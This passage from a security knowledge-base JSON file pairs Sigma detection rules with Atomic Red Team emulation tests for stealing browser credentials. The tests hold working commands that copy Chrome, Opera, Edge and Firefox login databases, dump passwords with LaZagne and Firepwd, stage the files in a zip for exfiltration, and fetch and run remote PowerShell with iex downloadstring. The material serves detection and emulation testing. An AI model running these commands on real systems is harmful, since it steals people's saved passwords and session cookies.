+                            "raw": "author: TropChaud\ndate: 2022/12/19\ndescription: Detect usage of the \"sqlite\" binary to query databases in Chromium-based\n  browsers for potential data stealing.\ndetection:\n  condition: all of selection_*\n  selection_chromium:\n    CommandLine|contains:\n    - \\User Data\\\n    - \\Opera Software\\\n    - \\ChromiumViewer\\\n  selection_data:\n    CommandLine|contains:\n    - Login Data\n    - Cookies\n    - Web Data\n    - History\n    - Bookmarks\n  selection_sql:\n  - Product: SQLite\n  - Image|endswith:\n    - \\sqlite.exe\n    - \\sqlite3.exe\nfalsepositives:\n- Unknown\nid: 24c77512-782b-448a-8950-eddb0785fc71\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/84d9edaaaa2c5511144521b0e4af726d1c7276ce/atomics/T1539/T1539.md#atomic-test-2---steal-chrome-cookies-windows\n- https://blog.cyble.com/2022/04/21/prynt-stealer-a-new-info-stealer-performing-clipper-and-keylogger-activities/\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1539\n- attack.t1555.003\n- attack.collection\n- attack.t1005\ntitle: SQLite Chromium Profile Data DB Access\n",
+                            "sigma:id": "24c77512-782b-448a-8950-eddb0785fc71",
+                            "title": "SQLite Chromium Profile Data DB Access",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
+                        "lookup_data": {
+                            "description": "Cyberattack on fuel supplier causes supply chain disruption",
+                            "link": "http://www.botvrij.eu/data/feed-osint/cdc842aa-761d-48e2-9b97-c344bed8b3a8.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1644231782",
+                            "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fc028194-969d-4122-8abe-0470d5b8f12f",
+                        "lookup_data": {
+                            "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\nWeb browsers typically store the credentials in an encrypted format within a credential store.\n",
+                            "raw": "author: frack113\ndate: 2022/01/30\ndescription: 'Adversaries may acquire credentials from web browsers by reading files\n  specific to the target browser.\n\n  Web browsers commonly save credentials such as website usernames and passwords so\n  that they do not need to be entered manually in the future.\n\n  Web browsers typically store the credentials in an encrypted format within a credential\n  store.\n\n  '\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n    ScriptBlockText|contains|all:\n    - Copy-Item\n    - -Destination\n  selection_path:\n    ScriptBlockText|contains:\n    - \\Opera Software\\Opera Stable\\Login Data\n    - \\Mozilla\\Firefox\\Profiles\n    - \\Microsoft\\Edge\\User Data\\Default\n    - \\Google\\Chrome\\User Data\\Default\\Login Data\n    - \\Google\\Chrome\\User Data\\Default\\Login Data For Account\nfalsepositives:\n- Unknown\nid: fc028194-969d-4122-8abe-0470d5b8f12f\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md\nrelated:\n- id: 98f4c75c-3089-44f3-b733-b327b9cd9c9d\n  type: obsoletes\n- id: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1555.003\ntitle: Access to Browser Login Data\n",
+                            "sigma:id": "fc028194-969d-4122-8abe-0470d5b8f12f",
+                            "title": "Access to Browser Login Data",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1555.003",
+                "display_name": "Credentials from Password Stores: Credentials from Web Browsers",
+                "atomic_tests": [
+                    {
+                        "name": "Run Chrome-password Collector",
+                        "auto_generated_guid": "8c05b133-d438-47ca-a630-19cc464c4622",
+                        "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "File path for modified Sysinternals",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Modified Sysinternals must be located at #{file_path}\n",
+                                "prereq_command": "if (Test-Path \"#{file_path}\\SysInternals\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"#{file_path}\\Modified-SysInternalsSuite.zip\"\nExpand-Archive \"#{file_path}\\Modified-SysInternalsSuite.zip\" \"#{file_path}\\sysinternals\" -Force\nRemove-Item \"#{file_path}\\Modified-SysInternalsSuite.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Start-Process \"#{file_path}\\Sysinternals\\accesschk.exe\" -ArgumentList \"-accepteula .\"\n",
+                            "cleanup_command": "Remove-Item \"#{file_path}\\Sysinternals\" -Force -Recurse -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Search macOS Safari Cookies",
+                        "auto_generated_guid": "c1402f7b-67ca-43a8-b5f3-3143abedc01b",
+                        "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "search_string": {
+                                "description": "String to search Safari cookies to find.",
+                                "type": "string",
+                                "default": "coinbase"
+                            }
+                        },
+                        "executor": {
+                            "command": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "LaZagne - Credentials from Browser",
+                        "auto_generated_guid": "9a2915b3-3954-4cce-8c76-00fbf4dbd014",
+                        "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "lazagne_path": {
+                                "description": "Path to LaZagne",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n",
+                                "prereq_command": "if (Test-Path \"#{lazagne_path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{lazagne_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\" -OutFile \"#{lazagne_path}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "command": "\"#{lazagne_path}\" browsers\n"
+                        }
+                    },
+                    {
+                        "name": "Simulating access to Chrome Login Data",
+                        "auto_generated_guid": "3d111226-d09a-4911-8715-fe11664f960d",
+                        "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Chrome must be installed\n",
+                                "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n",
+                            "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data For Account\" -Force -ErrorAction Ignore\n"
+                        }
+                    },
+                    {
+                        "name": "Simulating access to Opera Login Data",
+                        "auto_generated_guid": "28498c17-57e4-495a-b0be-cc1e36de408b",
+                        "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Opera must be installed\n",
+                                "prereq_command": "if (((Test-Path \"$env:LOCALAPPDATA\\Programs\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Opera\\launcher.exe\"))) {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe\nStart-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'\nStart-Sleep -s 180\nStop-Process -Name \"opera\"\n"
+                            },
+                            {
+                                "description": "Opera login data file must exist\n",
+                                "prereq_command": "if (Test-Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -ItemType File\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n",
+                            "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\n"
+                        }
+                    },
+                    {
+                        "name": "Simulating access to Windows Firefox Login Data",
+                        "auto_generated_guid": "eb8da98a-2e16-4551-b3dd-83de49baa14c",
+                        "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Firefox must be installed\n",
+                                "prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\"}else {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US\"}\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefoxsetup.exe\"\n(New-Object Net.WebClient).DownloadFile($url,$installer)\nStart-Process $installer -ArgumentList '/S' -Wait\n"
+                            },
+                            {
+                                "description": "Firefox login data file must exist\n",
+                                "prereq_command": "if (Test-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"}else {$firefox=\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\"}\nStart-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait\nStart-Process $firefox -NoNewWindow\nStart-Sleep -s 20\nStop-Process -Name firefox\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse\n",
+                            "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Profiles\" -Force -ErrorAction Ignore -Recurse\n"
+                        }
+                    },
+                    {
+                        "name": "Simulating access to Windows Edge Login Data",
+                        "auto_generated_guid": "a6a5ec26-a2d1-4109-9d35-58b867689329",
+                        "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Edge must be installed\n",
+                                "prereq_command": "if (Test-Path \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "\"Installation is not implemented as Edge is a part of windows\"\n"
+                            },
+                            {
+                                "description": "Edge login data file must exist\n",
+                                "prereq_command": "if (Test-Path \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse\n",
+                            "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -ErrorAction Ignore -Recurse\n"
+                        }
+                    },
+                    {
+                        "name": "Decrypt Mozilla Passwords with Firepwd.py",
+                        "auto_generated_guid": "dc9cd677-c70f-4df5-bd1c-f114af3c2381",
+                        "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "Firepwd_Path": {
+                                "description": "Filepath for Firepwd.py",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004\\Scripts\\Firepwd.py"
+                            },
+                            "Out_Filepath": {
+                                "description": "Filepath to output results to",
+                                "type": "string",
+                                "default": "$env:temp\\T1555.003Test8.txt"
+                            },
+                            "VS_CMD_Path": {
+                                "description": "Filepath to Visual Studio Build Tools Command prompt",
+                                "type": "string",
+                                "default": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat"
+                            },
+                            "Python_Path": {
+                                "description": "Filepath to python",
+                                "type": "string",
+                                "default": "C:\\Program Files\\Python310\\python.exe"
+                            },
+                            "venv_path": {
+                                "description": "Path to the folder for the tactics venv",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Firefox profile directory must be present\n",
+                                "prereq_command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\"\nmsiexec.exe /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n"
+                            },
+                            {
+                                "description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
+                                "prereq_command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe.\"\n"
+                            },
+                            {
+                                "description": "Python must be installed\n",
+                                "prereq_command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
+                            },
+                            {
+                                "description": "Computer must have venv configured at #{venv_path}\n",
+                                "prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "py -m venv \"#{venv_path}\"\n"
+                            },
+                            {
+                                "description": "Firepwd must exist at #{Firepwd_Path}\n",
+                                "prereq_command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"#{Firepwd_Path}\"\n"
+                            },
+                            {
+                                "description": "Pycryptodome library must be installed \n",
+                                "prereq_command": "if (#{venv_path}\\Scripts\\pip.exe show pycryptodome) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "if (test-path \"#{VS_CMD_Path}\"){#{venv_path}\\Scripts\\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n"
+                            },
+                            {
+                                "description": "Pyasn1 library must be installed \n",
+                                "prereq_command": "if (#{venv_path}\\Scripts\\pip.exe show pyasn1) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "if (test-path \"#{VS_CMD_Path}\") & {#{venv_path}\\Scripts\\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{venv_path}\\Scripts\\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}\ncat #{Out_Filepath}\n",
+                            "cleanup_command": "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue   \n"
+                        }
+                    },
+                    {
+                        "name": "LaZagne.py - Dump Credentials from Firefox Browser",
+                        "auto_generated_guid": "87e88698-621b-4c45-8a89-4eaebdeaabb1",
+                        "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "lazagne_path": {
+                                "description": "Path you put LaZagne Github with LaZagne.py",
+                                "type": "string",
+                                "default": "/tmp/LaZagne/Linux"
+                            },
+                            "specific_module": {
+                                "description": "You may change the module to \"all\" for all password that can be found by LaZagne.py",
+                                "type": "string",
+                                "default": "browsers -firefox"
+                            },
+                            "output_file": {
+                                "description": "This is where output for the Firefox passwords goes",
+                                "type": "string",
+                                "default": "/tmp/firefox_password.txt"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Get Lazagne from Github and install requirements",
+                                "prereq_command": "test -f #{lazagne_path}/laZagne.py",
+                                "get_prereq_command": "cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt"
+                            },
+                            {
+                                "description": "Needs git, python3 and some pip stuff",
+                                "prereq_command": "which git && which python3 && which pip",
+                                "get_prereq_command": "apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto"
+                            }
+                        ],
+                        "executor": {
+                            "command": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}",
+                            "cleanup_command": "rm -R /tmp/LaZagne; rm -f #{output_file}",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Stage Popular Credential Files for Exfiltration",
+                        "auto_generated_guid": "f543635c-1705-42c3-b180-efd6dc6e7ee7",
+                        "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n",
+                            "cleanup_command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - BrowserPwn",
+                        "auto_generated_guid": "764ea176-fb71-494c-90ea-72e9d85dce76",
+                        "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive",
+                            "cleanup_command": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Loot local Credentials - mimi-kittenz",
+                        "auto_generated_guid": "ec1d0b37-f659-4186-869f-31a554891611",
+                        "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials",
+                        "auto_generated_guid": "e5e3d639-6ea8-4408-9ecd-d5a286268ca0",
+                        "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Simulating Access to Chrome Login Data - MacOS",
+                        "auto_generated_guid": "124e13e5-d8a1-4378-a6ee-a53cd0c7e369",
+                        "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "executor": {
+                            "command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n",
+                            "cleanup_command": "rm \"/tmp/T1555.003_Login Data\" >/dev/null 2>&1\nrm \"/tmp/T1555.003_Login Data For Account\" >/dev/null 2>&1\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "WebBrowserPassView - Credentials from Browser",
+                        "auto_generated_guid": "e359627f-2d90-4320-ba5e-b0f878155bbe",
+                        "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "webbrowserpassview_path": {
+                                "description": "Path to the WebBrowserPassView executable ",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}\n",
+                                "prereq_command": "if (Test-Path \"#{webbrowserpassview_path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile \"#{webbrowserpassview_path}\"\n"
